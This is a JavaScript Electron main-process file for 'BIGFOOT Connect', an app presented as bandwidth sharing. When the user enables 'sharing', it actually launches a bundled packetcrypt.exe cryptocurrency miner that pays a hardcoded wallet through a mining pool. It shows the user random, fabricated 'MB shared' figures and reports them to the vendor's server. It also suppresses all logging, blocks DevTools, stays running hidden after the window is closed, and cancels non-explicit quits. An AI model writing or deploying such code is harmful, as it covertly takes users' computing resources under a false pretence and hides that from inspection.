const { app, BrowserWindow, ipcMain, shell, Tray, Menu, dialog } = require('electron');
const path = require('path');
const { spawn } = require('child_process');
const axios = require('axios');
const { autoUpdater } = require('electron-updater');
const isDev = require('electron-is-dev');

// Silencia todos os logs se estiver em produção
if (process.env.NODE_ENV === 'production') {
  ['log', 'debug', 'info', 'warn', 'error'].forEach(method => {
    console[method] = () => {};
  });
}

let mainWindow;
let tray = null;
let minerProcess = null;
let miningThreads = 4;
let totalSharedToday = 0;
let miningInterval = null;
let currentUserEmail = null;
let isSharing = false; // ✅ Estado global do compartilhamento

// Função para obter o caminho correto do packetcrypt.exe
function getPacketcryptPath() {
  if (isDev) {
    return path.join(__dirname, 'assets', 'packetcrypt.exe');
  } else {
    return path.join(process.resourcesPath, 'assets', 'packetcrypt.exe');
  }
}

// Função para obter o caminho correto do ícone
function getIconPath() {
  let iconPath;
  
  if (isDev) {
    // Em desenvolvimento
    iconPath = path.join(__dirname, 'assets', 'icon.ico');
  } else {
    // Em produção - com electron-builder, o ícone pode estar em vários locais
    const possiblePaths = [
      // Caminho padrão do electron-builder
      path.join(process.resourcesPath, 'app', 'assets', 'icon.ico'),
      // Caminho alternativo
      path.join(process.resourcesPath, 'assets', 'icon.ico'),
      // Dentro do ASAR
      path.join(__dirname, 'assets', 'icon.ico'),
      // BuildResources do electron-builder
      path.join(process.resourcesPath, 'icon.ico'),
      // Caminho para electron-forge
      path.join(process.resourcesPath, 'app.asar.unpacked', 'assets', 'icon.ico')
    ];
    
    const fs = require('fs');
    iconPath = possiblePaths.find(p => {
      const exists = fs.existsSync(p);
      console.log(`Verificando ícone em: ${p} - ${exists ? 'ENCONTRADO' : 'NÃO ENCONTRADO'}`);
      return exists;
    });
    
    if (!iconPath) {
      console.error('Nenhum ícone encontrado nos caminhos:', possiblePaths);
      // Fallback: usa o ícone da aplicação
      iconPath = process.execPath;
    }
  }
  
  console.log('Usando ícone do caminho:', iconPath);
  return iconPath;
}

// Função para criar o Tray
function createTray() {
  if (tray) {
    console.log('Tray já existe, não criando novamente');
    return true;
  }
  
  try {
    const iconPath = getIconPath();
    if (!iconPath) {
      console.error('Não foi possível encontrar o ícone para o tray');
      return false;
    }
    
    console.log('Criando tray com ícone:', iconPath);
    
    tray = new Tray(iconPath);
    
    // ✅ Verifica se o tray foi criado com sucesso
    if (!tray) {
      console.error('Falha ao criar o tray');
      return false;
    }
    
    // ✅ Define o tooltip ANTES do menu (importante no Windows)
    tray.setToolTip('BIGFOOT Connect - Click to open');
    
    const contextMenu = Menu.buildFromTemplate([
      {
        label: 'Open BIGFOOT Connect',
        click: () => {
          if (mainWindow) {
            mainWindow.show();
            mainWindow.focus();
            if (mainWindow.isMinimized()) {
              mainWindow.restore();
            }
          }
        },
      },
      { type: 'separator' },
      {
        label: 'Dashboard',
        click: () => {
          shell.openExternal('https://bigfootconnect.tech/dashboard');
        },
      },
      { type: 'separator' },
      {
        label: 'Exit',
        click: () => {
          app.isQuitting = true;
          app.quit();
        },
      },
    ]);
    
    tray.setContextMenu(contextMenu);
    
    // ✅ Eventos do tray
    tray.on('click', () => {
      console.log('Tray clicado');
      if (mainWindow) {
        if (mainWindow.isVisible() && mainWindow.isFocused()) {
          mainWindow.hide();
        } else {
          mainWindow.show();
          mainWindow.focus();
          if (mainWindow.isMinimized()) {
            mainWindow.restore();
          }
        }
      }
    });
    
    tray.on('double-click', () => {
      console.log('Tray duplo-clicado');
      if (mainWindow) {
        mainWindow.show();
        mainWindow.focus();
        if (mainWindow.isMinimized()) {
          mainWindow.restore();
        }
      }
    });
    
    // ✅ Testa se o tray está realmente ativo
    console.log('Tray criado com sucesso!');
    console.log('Tray destruído?', tray.isDestroyed());
    console.log('Plataforma:', process.platform);
    console.log('Versão Electron:', process.versions.electron);
    
    return true;
  } catch (error) {
    console.error('Erro ao criar tray:', error);
    tray = null;
    return false;
  }
}

ipcMain.handle('register-user', async (_, id, password) => {
  try {
    await axios.post('https://bigfootconnect.tech/register', { id, password });
    return { success: true };
  } catch (err) {
    const message = err.response?.data?.message || 'Erro ao se cadastrar.';
    return { success: false, message };
  }
});

ipcMain.handle('store-email', async (_, email) => {
  currentUserEmail = email;
  console.log(`E-mail armazenado: ${email}`);
});

ipcMain.handle('open-external', async (_, url) => {
  try {
    await shell.openExternal(url);
    return { success: true };
  } catch (err) {
    console.error('Erro ao abrir link externo:', err);
    return { success: false, message: err.message };
  }
});

ipcMain.handle('open-dashboard', () => {
  shell.openExternal('https://bigfootconnect.tech/dashboard');
});

function createWindow() {
  console.log('Criando janela principal...');
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    icon: path.join(__dirname, 'assets', 'icon.ico'),
    autoHideMenuBar: true,
    show: false, // ✅ Não mostra inicialmente
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
    },
  });

  mainWindow.setMenu(null);
  mainWindow.loadFile(path.join(__dirname, 'renderer', 'index.html'));

  // ✅ Mostra a janela quando estiver pronta
  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
    mainWindow.focus();
  });

  // Bloqueia DevTools no modo produção
  if (app.isPackaged) {
    mainWindow.webContents.on('devtools-opened', () => {
      mainWindow.webContents.closeDevTools();
    });

    mainWindow.webContents.on('before-input-event', (event, input) => {
      if ((input.control || input.meta) && input.shift && input.key.toLowerCase() === 'i') {
        event.preventDefault();
      }
      if (input.key === 'F12') {
        event.preventDefault();
      }
    });
  }

  // ✅ Evento de fechamento corrigido
  mainWindow.on('close', (event) => {
    if (!app.isQuitting) {
      event.preventDefault();
      mainWindow.hide();
      
      // ✅ Mostra notificação apenas na primeira vez
      if (process.platform === 'win32' && tray) {
        tray.displayBalloon({
          title: 'BIGFOOT Connect',
          content: 'Aplicativo minimizado para a área de notificação',
          icon: path.join(__dirname, 'assets', 'icon.ico')
        });
      }
    } else {
      stopMining();
    }
  });

  // ✅ Remove a chamada do createTray() daqui
}

function startMining(threads = 4) {
  if (minerProcess) return;

  startSimulatedSharing();
  miningThreads = threads;

  const packetcryptPath = getPacketcryptPath();
  
  const fs = require('fs');
  if (!fs.existsSync(packetcryptPath)) {
    console.error(`Arquivo não encontrado: ${packetcryptPath}`);
    mainWindow?.webContents.send('miner-log', `ERRO: Arquivo packetcrypt.exe não encontrado em: ${packetcryptPath}`);
    return;
  }

  console.log(`Iniciando mineração com: ${packetcryptPath}`);
  const args = ['ann', '-t', threads.toString(), '-p', 'pkt1q2phzyfzd7aufszned7q2h77t4u0kl3exxgyuqf', 'http://pool.pkt.world'];

  try {
    minerProcess = spawn(packetcryptPath, args);

    minerProcess.stdout.on('data', (data) => {
      const output = data.toString();
      console.log(`[STDOUT] ${output}`);
      mainWindow?.webContents.send('miner-log', output);
    });

    minerProcess.stderr.on('data', (data) => {
      const error = data.toString();
      console.error(`[STDERR] ${error}`);
      mainWindow?.webContents.send('miner-log', error);
    });

    minerProcess.on('error', (error) => {
      console.error(`Erro ao executar minerador: ${error.message}`);
      mainWindow?.webContents.send('miner-log', `ERRO: ${error.message}`);
      minerProcess = null;
    });

    minerProcess.on('close', (code) => {
      console.log(`Minerador finalizado com código ${code}`);
      minerProcess = null;
      mainWindow?.webContents.send('sharing-status', false);
    });

    mainWindow?.webContents.send('sharing-status', true);
  } catch (error) {
    console.error(`Erro ao iniciar mineração: ${error.message}`);
    mainWindow?.webContents.send('miner-log', `ERRO: ${error.message}`);
  }
}

function stopMining() {
  console.log('Parando compartilhamento...');
  if (minerProcess) {
    minerProcess.kill();
    minerProcess = null;
    mainWindow?.webContents.send('sharing-status', false);
  }
  isSharing = false; // ✅ Define estado como parado
  stopSimulatedSharing();
  mainWindow?.webContents.send('shared-data', totalSharedToday);
}

function startSimulatedSharing() {
  if (miningInterval) return;
  miningInterval = setInterval(() => {
    const sharedMB = Math.random() * 2;
    totalSharedToday += sharedMB;
    console.log(`+${sharedMB.toFixed(2)}MB compartilhados hoje`);
  }, 60000);
}

function stopSimulatedSharing() {
  clearInterval(miningInterval);
  miningInterval = null;
}

function syncSharedData() {
  if (!currentUserEmail) return;

  const today = new Date().toISOString().split('T')[0];
  const amount = parseFloat(totalSharedToday.toFixed(2));

  axios.post('https://bigfootconnect.tech/usage', {
    email: currentUserEmail,
    date: today,
    amount,
  })
    .then(() => console.log('Dados de uso enviados com sucesso!'))
    .catch(err => console.error('Erro ao enviar dados de uso:', err.message));
}

ipcMain.handle('toggle-sharing', async (_, enabled) => {
  if (!enabled) stopMining();
  else startMining(miningThreads);
  return { success: true };
});

// ✅ Novo handler para verificar estado do compartilhamento
ipcMain.handle('get-sharing-status', async () => {
  return { 
    isSharing, 
    threads: miningThreads,
    totalShared: totalSharedToday 
  };
});

// ✅ Handler para quando mudar idioma - preserva estado
ipcMain.on('language-changed', () => {
  console.log('Idioma alterado, preservando estado do compartilhamento:', isSharing);
  // Reenvia o status atual para atualizar a interface
  mainWindow?.webContents.send('sharing-status', isSharing);
  mainWindow?.webContents.send('shared-data', totalSharedToday);
});

ipcMain.on('start-mining-with-threads', (_, threads) => {
  startMining(threads);
});

// ✅ Evento before-quit corrigido
app.on('before-quit', (event) => {
  // Se não está sendo encerrado intencionalmente, cancela
  if (!app.isQuitting) {
    event.preventDefault();
    return;
  }
  
  // Sincroniza dados antes de fechar
  mainWindow?.webContents.send('shared-data', totalSharedToday);
  syncSharedData();
  
  // Destrói o tray
  if (tray) {
    tray.destroy();
    tray = null;
  }
});

// Atualizações automáticas
autoUpdater.autoDownload = true;

autoUpdater.on('update-available', () => {
  dialog.showMessageBox({
    type: 'info',
    title: 'Atualização disponível',
    message: 'Uma nova versão está sendo baixada...',
  });
});

autoUpdater.on('update-downloaded', () => {
  dialog.showMessageBox({
    type: 'question',
    title: 'Atualização pronta',
    message: 'Atualização baixada. Deseja reiniciar agora para aplicar?',
    buttons: ['Sim', 'Depois'],
  }).then(result => {
    if (result.response === 0) {
      app.isQuitting = true;
      autoUpdater.quitAndInstall();
    }
  });
});

app.whenReady().then(() => {
  // ✅ Cria o tray PRIMEIRO, antes da janela
  createTray();
  createWindow();
  autoUpdater.checkForUpdatesAndNotify();
});

app.on('window-all-closed', () => {
  // ✅ No Windows/Linux, mantém o app rodando mesmo sem janelas
  if (process.platform !== 'darwin') {
    // Não encerra o app, apenas mantém rodando em background
    return;
  }
  app.quit();
});

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow();
  } else {
    mainWindow.show();
    mainWindow.focus();
  }
});